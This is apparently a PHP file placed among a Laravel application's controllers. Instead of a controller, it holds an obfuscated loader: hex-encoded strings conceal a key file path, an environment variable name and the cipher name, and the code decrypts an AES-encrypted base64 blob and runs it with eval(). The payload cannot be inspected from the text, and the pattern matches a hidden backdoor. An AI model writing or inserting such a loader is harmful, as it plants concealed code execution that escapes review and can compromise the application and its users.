<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('GvYNwatnutvXFwbmbKahWA==');

$c=base64_decode(

'M2xiResn1lktSZA4gN1k4kMbSfkZVLf7aOlCGZZt/4vM9zh1UUXuRROKnGHRjvZgo0Ydh99Qn3Am' .
'xFyuWDR0bWEd+QhM7DP5BWQ3zROe/7crKpYzLe/R+z4FIHdALF8JsYnAchsw5UY4UtHZYbQOpB+O' .
'U9yEkZGbm7AjEEpqQ2Uw0aIsSnrFzfJ4exXJJPix5jnL+HLb15MI4/jtqAYNRjRtrolygPPg/3uX' .
'NIdMR+L1qBwWemdZP0t62+mzKhFY'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

